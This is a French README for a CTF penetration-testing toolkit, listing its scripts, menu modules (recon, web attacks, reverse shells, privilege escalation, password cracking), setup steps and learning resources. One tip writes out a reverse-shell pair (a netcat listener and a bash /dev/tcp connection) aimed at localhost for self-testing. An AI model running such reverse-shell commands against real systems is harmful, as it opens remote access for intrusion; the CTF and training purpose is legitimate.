# 🚀 Cornedry CTF EDITION - README

## 📦 Contenu du Pack

Vous avez téléchargé le **CORNEDRY CTF TOOLKIT ULTIMATE EDITION** !

### Fichiers inclus :

1. **`Cornedry_ctf_enhanced.sh`** (39 KB)
   - Script principal optimisé pour CTF
   - Interface interactive avec 7 modules
   - Gestion automatique des résultats

2. **`setup_ctf_environment.sh`** (13 KB)
   - Installation automatique de TOUS les outils
   - À exécuter AVANT le CTF (une seule fois)
   - Télécharge wordlists et scripts

3. **`CTF_SURVIVAL_GUIDE.md`** (8.2 KB)
   - Guide complet avec stratégies
   - Commandes one-liner
   - Workflow optimisé

4. **`CTF_EMERGENCY_CHEATSHEET.md`** (6.4 KB)
   - Référence rapide ultra-compacte
   - À garder ouvert pendant le CTF
   - Tous les essentiels en 1 page

---

## ⚡ INSTALLATION RAPIDE (15 minutes)

### Étape 1 : Préparer l'environnement (AVANT le CTF)

```bash
# Rendre les scripts exécutables
chmod +x setup_ctf_environment.sh
chmod +x Cornedry_ctf_enhanced.sh

# Lancer l'installation (une seule fois)
./setup_ctf_environment.sh
```

**Ce script va :**
- ✅ Installer tous les outils (nmap, gobuster, sqlmap, john, hashcat, etc.)
- ✅ Télécharger les wordlists (rockyou, SecLists)
- ✅ Cloner les repos GitHub (LinPEAS, PayloadsAllTheThings, etc.)
- ✅ Créer votre workspace CTF organisé
- ✅ Configurer des alias pratiques

**Durée : ~10-15 minutes** (selon votre connexion)

### Étape 2 : Activer les alias

```bash
source ~/.bashrc
```

### Étape 3 : Vérifier l'installation

```bash
# Test rapide
nmap --version
gobuster version
john

# Tout devrait fonctionner !
```

---

## 🎯 UTILISATION PENDANT LE CTF

### Lancer Cornedry

```bash
# Méthode 1 : Script direct
./Cornedry_ctf_enhanced.sh

# Méthode 2 : Alias (après source ~/.bashrc)
Cornedry

# Méthode 3 : Depuis n'importe où
cd ~/ctf_workspace
Cornedry
```

### Interface Principale

Le menu principal offre **7 modules** :

```
[1] Quick Recon           - Scan rapide de la cible
[2] Web Exploitation      - Attaques web (SQLi, XSS, LFI...)
[3] Reverse Shells        - Génération et réception de shells
[4] Privilege Escalation  - Outils d'élévation de privilèges
[5] Password Cracking     - Cassage de hash et mots de passe
[6] File Transfer         - Serveurs de transfert de fichiers
[7] Notes & Loot          - Gestion des découvertes et flags

[S] Set Target           - Définir la cible
[L] Set LHOST            - Définir votre IP locale
[X] Exit                 - Quitter
```

### Workflow Typique

```
1. Définir votre cible : [S] → Entrer l'IP
2. Quick Recon : [1] → [7] All-in-One Scan
3. Pendant le scan, vérifier : [7] Notes pour documenter
4. Exploitation selon les ports trouvés :
   - Web (80/443) → [2]
   - Accès shell → [3]
   - PrivEsc → [4]
5. Flags trouvés → [7] → [3] Add Flag
```

---

## 📚 GUIDES ET RESSOURCES

### Pendant le CTF : Garde ces fichiers ouverts

**Terminal 1 :** Cornedry
```bash
./Cornedry_ctf_enhanced.sh
```

**Terminal 2 :** Cheatsheet d'urgence
```bash
cat CTF_EMERGENCY_CHEATSHEET.md
# Ou avec less pour navigation :
less CTF_EMERGENCY_CHEATSHEET.md
```

**Terminal 3 :** Pour commandes manuelles
```bash
# Espace de travail
cd ~/ctf_workspace
```

### Ressources externes

Le guide complet contient des liens vers :
- GTFOBins (SUID exploits)
- HackTricks (bible du hacking)
- PayloadsAllTheThings
- CrackStation (hash online)

---

## 🗂️ ORGANISATION DES FICHIERS

Après installation, votre arborescence :

```
$HOME/
├── tools/                    # Tous les outils GitHub
│   ├── PEASS-ng/            # LinPEAS/WinPEAS
│   ├── SecLists/            # Wordlists géantes
│   ├── PayloadsAllTheThings/
│   ├── XSStrike/
│   ├── Responder/
│   └── linux-smart-enumeration/
│
└── ctf_workspace/           # Zone de travail CTF
    ├── logs/                # Logs de session
    ├── loot/                # Credentials, flags trouvés
    ├── scans/               # Résultats de scans (auto-save)
    ├── exploits/            # Payloads générés
    └── notes/               # Notes rapides
```

**Tout est organisé automatiquement !**

---

## 💡 CONSEILS PRO

### Avant le CTF (La veille)

1. **Tester l'installation**
   ```bash
   nmap --version && john && hashcat --version
   ```

2. **Vérifier les wordlists**
   ```bash
   ls -lh /usr/share/wordlists/rockyou.txt
   # Doit faire ~134 MB
   ```

3. **Décompresser rockyou si nécessaire**
   ```bash
   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
   ```

4. **Tester une connexion reverse shell** (sur ta propre machine)
   ```bash
   # Terminal 1
   nc -lvnp 4444
   
   # Terminal 2
   bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
   ```

### Pendant le CTF

1. **Toujours définir la cible d'abord** : `[S] Set Target`
2. **Documenter au fur et à mesure** : `[7] Notes`
3. **Sauvegarder les flags immédiatement** : `[7] → [3] Add Flag`
4. **Ne pas rester bloqué > 20 min** sur un challenge
5. **Faire des pauses toutes les heures** (meilleure productivité!)

### Après le CTF

1. **Exporter le rapport** : `[7] → [6] Export Report`
2. **Backup du workspace**
   ```bash
   tar -czf ctf_backup_$(date +%Y%m%d).tar.gz ~/ctf_workspace/
   ```

---

## 🔧 DÉPANNAGE

### Les outils ne s'installent pas ?

```bash
# Mettre à jour les repos
sudo apt update
sudo apt upgrade

# Relancer l'installation
./setup_ctf_environment.sh
```

### Permission denied sur les scripts ?

```bash
chmod +x *.sh
```

### Rockyou pas décompressé ?

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Les alias ne fonctionnent pas ?

```bash
source ~/.bashrc
# Ou redémarrer ton terminal
```

### Cornedry ne démarre pas ?

```bash
# Vérifier bash
bash --version

# Lancer en mode debug
bash -x Cornedry_ctf_enhanced.sh
```

---

## 🎓 RESSOURCES D'APPRENTISSAGE

### Pour s'entraîner avant le CTF

- **TryHackMe** : https://tryhackme.com/
  - Rooms recommandées : Linux PrivEsc, Web Fundamentals
  
- **HackTheBox** : https://www.hackthebox.eu/
  - Machines "Easy" pour commencer
  
- **OverTheWire** : https://overthewire.org/
  - Bandit (Linux basics)
  - Natas (Web exploitation)

### Références importantes

- **GTFOBins** : https://gtfobins.github.io/
  - Exploits pour binaires SUID/Sudo
  
- **HackTricks** : https://book.hacktricks.xyz/
  - Bible du pentesting
  
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
  - Collection de payloads
  
- **Reverse Shell Cheatsheet** : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

---

## 📊 STATISTIQUES

- **Outils installés** : 50+
- **Scripts automatisés** : 10+
- **Wordlists** : 3+ GB
- **Payloads** : 1000+
- **Lignes de code** : 2000+

---

## 🏆 CHECKLIST FINALE AVANT LE CTF

- [ ] Installation complète exécutée
- [ ] Tous les outils testés
- [ ] Wordlists décompressés
- [ ] Alias activés
- [ ] Guides lus en diagonale
- [ ] Cheatsheet imprimé/ouvert
- [ ] Café préparé ☕
- [ ] Mindset de gagnant 💪

---

## 🎮 MESSAGE FINAL

**Ton arsenal est prêt. Les outils sont aiguisés. Le workspace est organisé.**

**Maintenant, à toi de jouer ! 🚀**

### Quelques derniers conseils :

1. **Enumerate, enumerate, enumerate** - 80% du travail
2. **Google est ton ami** - Chaque erreur a été vue avant toi
3. **Documente tout** - Tu oublieras sinon
4. **Reste calme** - Le stress diminue les performances
5. **Amuse-toi !** - C'est l'objectif principal

---

## 📞 SUPPORT

En cas de problème :
1. Lire le guide de survie : `CTF_SURVIVAL_GUIDE.md`
2. Consulter la cheatsheet : `CTF_EMERGENCY_CHEATSHEET.md`
3. Google l'erreur exacte
4. Vérifier les forums CTF

---

## 📜 LICENCE

Ce toolkit est fourni "AS IS" pour usage éducatif et CTF uniquement.
Utilisez-le de manière responsable et éthique !

---

## 🙏 CRÉDITS

- Script original : Melvin PETIT
- Optimisation CTF : Claude (Anthropic)
- Communauté open-source pour tous les outils

---

**Good luck, have fun, and may the flags be with you! 🎯**

```
 _____ _____ _____ 
|   __|_   _|   __|
|   __|  | | |   __|
|__|     |_| |__|   
```

**Cornedry : Because speed matters in CTF! ⚡**
